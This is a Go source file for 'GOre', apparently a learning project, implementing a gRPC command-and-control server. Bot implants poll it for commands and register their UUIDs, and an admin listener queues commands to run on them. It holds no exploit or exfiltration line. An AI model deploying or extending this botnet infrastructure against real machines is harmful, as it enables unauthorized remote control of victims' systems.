package main

import (
	"context"
	"errors"
	"fmt"
	"gore/grpcapi" //the pain to get this to work was immense. Golang needs to slow the fuck down and stop depreciating packages.
	"log"
	"net"

	"google.golang.org/grpc"
)

// empty array for UUID storage
var uuid_list = []string{}

// empty slice of implant server structs.
var implant_list = []*implantServer{}

/*It should be said, I think that these commands are invoked automatically, based on the RPC that was recieved, as the server decides what to do and when to do it. We don't invoke these explicitly, yet they are invoked.*/
// create a struct for handling commands
type implantServer struct {
	work, output chan *grpcapi.Command //create a new thread to handle commands, in Golang this is defined by the "chan" type or "channel".
	uuid         string                //store UUID strings to be indexable
}

// we need to have a seperate admin struct for handling admin commands, that way we don't run OS commands on the server, only on clients
type adminServer struct {
	work, output chan *grpcapi.Command //thread for admin services
	//uuid         chan *grpcapi.Registration //myabe??
}

// we impliment these sepertaly to keep them mutally exclusive. Each one has a a channel for sending/recieving work and command output.
func NewImplantServer(work, output chan *grpcapi.Command) *implantServer { //returns a pointer to implant server
	s := new(implantServer) //instantiate a struct of implantServer, name it s
	s.work = work           //assign work
	s.output = output       //assign output
	return s                //return the struct.
}

// similar to instantiating an inplant server
func NewAdminServer(work, output chan *grpcapi.Command) *adminServer { //returns a pointer to admin server
	s := new(adminServer) //instantiate a struct of implantServer, name it s
	s.work = work         //assign work
	s.output = output     //assign output
	return s              //return the struct.
}

// ctx is part of the built-in golang package "context", it is used for the creation/handling of API calls, without shitting the bed when multiple calls are made at the same time like
// in a RESTful API. it's a bit more complex, but should pay off in the end. Also, according to Docs for context, it is a bad idea/not allowed to pass in NIL for a context value,
// nessecitating the need for our own "Empty" message value.
// define the methods of our structs. Thats what the pointers to structs mean prior to the function definitions. it's OOP baby.
func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) { //this acts as basically a polling mechanism, asking for work.
	var cmd = new(grpcapi.Command) //instantiate a new command from the grpcapi.
	select {                       //switch statement
	// <- is passing a value from a channel to a reference, similar to dequeing from a queue of jobs for multithreads/goroutines
	//this is also nonblocking and will run the default case if there is nothing to do.
	case cmd, ok := <-s.work:
		if ok { //check if command was successful
			return cmd, nil
		}
		return cmd, errors.New("[-] Channel closed.") //otherwise, return an error that the channel closed
	default:
		// if all the above fails, then no work is present
		return cmd, nil
	}
}

// this command will push the command onto the queue or the output channel/goroutine
func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}

// running of a command for our admin component; we push it to the Goroutine queue and have it be handled by multithreading.
func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command //assign res as a command struct
	//set up goroutine, doing os in this way is a type of closure, and this goroutine can access cmd from outside this fucntion.
	go func() {
		s.work <- cmd
	}()
	//assign command output to result, ie telling us if it ran properly.
	res = <-s.output
	return res, nil
}

// handle UUID
func (s *implantServer) RegisterNewImplant(ctx context.Context, uuid_result *grpcapi.Registration) (*grpcapi.Empty, error) {
	//var res *grpcapi.Registration
	res := uuid_result.GetUuid()
	//debug print statement to server
	uuidstr := fmt.Sprintf("%s", res)
	fmt.Println(res)
	fmt.Println(uuidstr)
	fmt.Println("[+] Recieved new registration request")
	//add uuid to the list that we have.
	uuid_list = append(uuid_list, uuidstr)
	implant_list = append(implant_list, s)
	//try printing the data to make sure it actually went the wqay that was expected
	fmt.Println("[+] Printing lists of registerd UUID's and implants:")
	fmt.Printf("%+q", uuid_list)
	fmt.Printf("%+q", implant_list)

	//now, we have to add this to a database, or in this case an in-memeory array or something as a placeholder.
	//return nil as I don't want to return something to the client.
	return &grpcapi.Empty{}, nil
}

//func (s *adminServer) ListRegisteredImplants(ctx context.Context, )
/*
the main server loop will run two seperate servers; one for getting requests from the admin clinet (that client being the one that we send our commands to for the server to parse)
and another server will be the one that communicates to the bots via polling. These servers are only logically different, not physically, so a takedown of the physical server will
lead to both being flatlined.
*/
func main() {
	//variables for main driver
	var (
		implantListener, adminListener net.Listener          //two listeners
		err                            error                 //errors
		opts                           []grpc.ServerOption   //server options
		work, output                   chan *grpcapi.Command //work and output goroutines
	)

	//TODO: create array for storing UUID's and another for a client list
	//empty array for UUID storage
	//uuid_list := []string{}
	//empty slice of implant server structs.
	//var implant_list = []implantServer{}
	//TODO: load file and read TLS data

	//create channels for passing input and output commands to implant and admin services
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	//instantiate a new implant to act as a device client and an admin server. We're doing this on the same channel, so IPC between them is shared on the same goroutine.
	implant := NewImplantServer(work, output)
	admin := NewAdminServer(work, output) //both share the same work and output
	//open and bind port 5000 on localhost on the server to listen to commands over tcp, check if nil and log a fatal error if so
	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 5000)); err != nil {
		fmt.Println("[-] implantListener has failed.")
		log.Fatal(err)
	}
	//do the same for an admin server, with a differnet port of course
	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
		fmt.Println("[-] adminListener has failed.")
		log.Fatal(err)
	}
	fmt.Println("[+] GOre server has started successfully.")
	//the "..." operator implies an input with a variable number of inputs, kinda like explicit function overloading. We declare that opts might have more variables associated with them than we specify.
	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	//register the servers. Do note we never explicitly defined these, protoc did. By compiling our .proto file, it gave us Golang functions for fri.
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	//use goroutines to serve implants
	go func() {
		grpcImplantServer.Serve(implantListener)
	}()
	//admin server is not multithreaded, only one is allowed.
	grpcAdminServer.Serve(adminListener)

}
